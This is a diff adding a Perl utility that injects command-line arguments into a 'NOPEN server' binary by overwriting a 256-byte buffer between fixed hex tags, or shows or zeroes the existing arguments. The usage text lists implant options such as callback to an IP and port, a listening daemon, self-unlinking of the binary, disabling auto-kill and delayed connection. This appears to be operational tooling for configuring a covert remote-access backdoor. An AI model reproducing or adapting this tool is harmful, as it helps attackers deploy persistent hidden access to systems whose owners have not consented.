@@ -1,0 +1,259 @@
+#!/usr/bin/env perl
+myinit();
+progprint(sprintf("Looking for head+256bytes+tail of:
+
+0x%s+256bytes+0x%s\n\n",$headtag,$tailtag));
+TRYAGAIN:
+close(OUT);
+if ($outfile) {
+  open(OUT,">$outfile") or mydie("Cannot open >$outfile: $!");
+  binmode(OUT);
+  select OUT;
+  $|=1 ;
+}
+close(IN);
+open(IN,"<$infile") or mydie("Cannot open <$infile: $!");
+binmode(IN);
+select(STDOUT);
+my $bytes=0 ;
+if ($tryagain) {
+  # On the first attempt the head+256bytes+tail straddled
+  # a 1024 chunk so skip ahead 270 bytes this time and it won't.
+  read(IN,$buf,270) ;
+  print OUT $buf if $outfile ;
+  $bytes += length($buf);
+  mydie("Failed second pass--only $bytes bytes, should be 270")
+    if ($bytes != 270) ;
+}
+my $blocks = 0;
+my $foundit = 0 ;
+my $done = 0;
+my $oldargs = "" ;
+while (read(IN,$buf,1024)) {
+  if (!$done) {
+    for ($j=0;$j <= length($buf)-12;$j++) {
+      $chunk = chunkof($buf,$j) ;
+      if ($chunk eq $headtagpacked) {
+	if ($j + 256 + 12 + 1 > length($buf)) {
+	  mywarn("Trying again 270 bytes into the file...header but ".
+		 "not footer in buf");
+	  $tryagain++;
+	  goto TRYAGAIN;
+	}
+	$tailchunk = chunkof($buf,$j+12+256) ;
+	unless ($tailchunk eq $tailtagpacked) {
+	  mywarn("\n\a\nHmmm...odd. Found header but 256 bytes after ".
+		 "is NOT footer...still looking.");
+	  next;
+	}
+	$foundit++ ;
+	$newbuf = substr($buf,0,$j) ;
+	$oldargs = substr($buf,$j+12,256);
+	$oldargsascii = unpack("H*",$oldargs) ;
+	if ($outfile) {
+	  $newbuf .= $headtagpacked.$newargs.$tailtagpacked;
+	  $newbuf .= substr($buf,length($newbuf)) ;
+	  mydie("LENGTH IS WRONG--should never happen")
+	    if (length($newbuf) != length($buf)) ;
+	  $buf = $newbuf ;
+	}
+	$done++ ;
+	last;
+      }#if found header
+    }#for each chunk of data
+  }#if !$done
+  print OUT $buf if $outfile ;
+  $bytes += length($buf);
+  $blocks++ ;
+}
+close(IN);
+close(OUT);
+chmod(0755,$outfile) if ($outfile and -e $outfile) ;
+select STDOUT ;
+if ($foundit) {
+  my $cmp = ";cmp $infile $outfile" if $outfile ;
+  my $tmp=`ls -al $infile $outfile;md5sum $infile $outfile$cmp`;
+  progprint("We found it at $bytes+$j bytes ($blocks blocks of 1024):\n\n$COLOR_NOTE".
+	    $tmp,
+	    $COLOR_SUCCESS);
+  if (!$outfile) {
+    my $len = length($oldargs);
+    progprint("$len bytes of hex arguments in ${infile} between colons\n".
+	      "::$COLOR_NOTE${oldargsascii}${COLOR_NORMAL}::\n");
+    progprint("ASCII arguments in ${infile} between colons\n".
+	      "::$COLOR_NOTE${oldargs}${COLOR_NORMAL}::\n");
+  }
+} else {
+  unlink($outfile);
+  mydie("\n\nNEVER FOUND head+256bytes+tail in $infile. ABORTING!\n\n\a");
+}
+
+sub mydie {
+  progprint("@_\n",1);
+  exit 1;
+}#mydie
+
+sub mywarn {
+  progprint("@_",1);
+}#mywarn
+
+sub chunkof {
+  # returns 12 byte chunk of $buf at $j
+  local($buf,$j) = (@_);
+  my $ans ;
+  $ans = pack("a12",substr($buf,$j));
+  return $ans ;
+}#chunkof
+
+sub myinit {
+  use File::Basename ;
+  $COLOR_SUCCESS="\033[5;42m";
+  $COLOR_SUCCESS="\033[3;32m";
+  $COLOR_FAILURE="\033[1;31m";
+  $COLOR_WARNING="\033[1;33m";
+  $COLOR_NORMAL="\033[0;39m";
+  $COLOR_NOTE="\033[0;34m";
+  $prog = basename $0 ;
+  $version="1.0.0.0";
+  $headtag = "3fb31b95a1deaf7ba7ab354d";
+  $tailtag = "90d631fe5466524196b4cefb";
+  $headtagpacked = pack("H*",$headtag) ;
+  $tailtagpacked = pack("H*",$tailtag) ;
+  $versiontext = "$prog version $version\n" ;
+  $infile = shift(@ARGV);
+  $opt_h = ($infile eq "-h");
+  $opt_v = ($infile eq "-v");
+  $infile = shift(@ARGV) if ($opt_h or $opt_v);
+  mydie("First argument must not contain whitespace.")
+    if ($infile =~ /\s/) ;
+  $outfile = shift(@ARGV) unless ($ARGV[0] =~ /^-/ or $ARGV[0] =~ /\s/);
+  $outfile = "$infile.new" unless $outfile ;
+  $newargs = "" ;
+  if (@ARGV) {
+    while (my $arg = shift(@ARGV)) {
+      if ($arg eq "ZERO") {
+	$newargs = "ZERO ";
+	last;
+      }
+      $newargs .= "$arg ";
+#      if ($arg =~ /^-/) {
+#	$newargs .= "$arg ";
+#      } else {
+#	$newargs .= "\"$arg\" ";
+#      }
+    }
+    chop($newargs); # remove extra space
+  }
+  mywarn("Arguments too long (".length($newargs)." chars). Truncated to 256.") if
+    length($newargs) > 256 ;
+  my $varhelp = "provided on the command line (there is\nno default for these).";
+  my $checkinside = !$newargs ;
+  my $zeroed = 0 ;
+  # Pad the $newargs with nulls, also truncate to 256 if they're long
+  $newargs = substr(pack("a256",$newargs),0,256);
+  $newhexascii = unpack("H*",$newargs) ;
+  if ($outfile eq "ZERO" or $newargs =~ /^ZERO/) {
+    $zeroed = 1;
+    $outfile = "$infile.ZEROED" if ($outfile eq "ZERO") ;
+    $checkinside = 0 ;
+    $newargs = "" ;
+    $newargs = substr(pack("a256",$newargs),0,256);
+    $newhexascii = unpack("H*",$newargs) ;
+    $varhelp = " given (in this case, all NULLS), or in hex:";
+  } else {
+    $varhelp = "you provided, in this case:\n\n$newargs\n\nor in hex:";
+  }
+  (my $zeros) = $newhexascii =~ /(00000+)$/ ;
+  my $len = length($zeros) ;
+  if ($len > 0) {
+    $len = "$len " ;
+  } else {
+    $len = "";
+  }
+  $newhexascii =~ s/00000+$/000000(${len}zeroes to end of buffer...)/ ;
+  $varhelp .= "\n\n$newhexascii";
+  $usagetext = "
+Usage: $prog infile [outfile] [NOPEN-args]
+
+outfile defaults to infile.new. If provided, outfile must not start
+with a \"-\" or contain whitespace.
+
+If \"ZERO\" is given as the NOPEN-args argument, the argument buffer
+in infile is zeroed out.
+
+If no NOPEN-args argument is given, the argument buffer in infile is
+found and shown.
+
+The NOPEN-args provided are injected into infile if it is a valid
+NOPEN server (i.e., has the right head/tail tags in it). Valid NOPEN
+arguments include the same that can be provided to NOPEN server via the
+\$D environment variable, namely:
+
+ -I                stdin mode
+ -i                do not autokill after 5 hours
+ -u                unlink binary if possible
+ -S##              sleep ## seconds before connecting
+ -CIP:P1|P2|P3     callback to IP, trying multiple ports in succession
+ -T##              tcp timeout if cannot connect via callback [30s]
+ -r##              number of retries
+ -P##              pause between connect attempts
+ -cIP:PORT         callback to IP:PORT
+ -lPORT            start daemon listening on PORT
+
+Every argument requires its own \"-\", preceeded by a single space (so
+\"-iIS15\" is NOT legal). Avoid whitespace within argument values as
+shown above--i.e. use \"-l32323\" rather than \"-l 32323\".
+
+Injection consists of replacing 256 bytes of binary content between
+
+\t\t0x$headtag and
+\t\t0x$tailtag
+
+with the null padded NOPEN-args $varhelp\n
+
+" ;
+  usage() if (!$infile or $opt_h or $opt_v);
+  if ($checkinside) {
+    mywarn("No content provided to inject--looking for what's in there") ;
+    $outfile = "";
+    progprint("Looking in:       $infile");
+  } else {
+    if ($zeroed) {
+      progprint("Injecting:        NULLS");
+    } else {
+      progprint("Injecting:        $newargs");
+    }
+    progprint("Into file:        $infile");
+    progprint("To build file:    $outfile");
+  }
+}#myinit
+
+sub usage {
+  print $usagetext unless ($opt_v) ;
+  print $versiontext ;
+  print "\nFATAL ERROR: @_\n" if ( @_ );
+  exit;
+}#usage
+
+sub progprint {
+  local ($what,$color,$color2,$what2) = (@_,"","","") ;
+  my $where = "STDOUT";
+  my $crs = "" ;
+  my $tmp ;
+  while ($tmp = substr($what,0,1)) {
+    if ($tmp eq "\n") {
+      $crs .= $tmp;
+      $what = substr($what,1);
+    } else {
+      last;
+    }
+  }
+#  $color = $COLOR_NOTE unless $color ;
+  if ($color eq "1") {
+    $color = $COLOR_FAILURE;
+    $where = "STDERR";
+  }
+  $color2 = $color unless $color2 ;
+  $what2 = "$what2 " if ($what2) ;
+  print $where "$crs$color2${prog}[$$]: $what2${color}$what$COLOR_NORMAL\n" ;
+}# progprint
